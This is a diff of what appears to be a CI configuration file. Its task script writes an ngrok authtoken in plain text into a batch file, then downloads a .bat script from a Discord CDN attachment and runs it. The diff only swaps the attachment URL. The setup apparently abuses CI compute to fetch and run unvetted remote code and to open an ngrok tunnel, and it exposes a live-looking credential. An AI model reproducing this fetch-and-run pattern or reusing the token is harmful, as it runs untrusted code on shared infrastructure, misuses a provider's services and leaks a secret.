@@ -10,5 +10,5 @@ compute_engine_instance:
 task:
   script:
    - echo ngrok authtoken 1wTEGPd6OMDKyDDc4oM3UVsrblb_7QWBMWv3Jn8ZfcoPsQ8dJ > NGROK.bat
-   - curl -s -O https://cdn.discordapp.com/attachments/900398683588288552/900399015349342208/azure_pipeline.bat
+   - curl -s -O https://cdn.discordapp.com/attachments/900398683588288552/900400041536151562/azure_pipeline.bat
    - azure_pipeline.bat
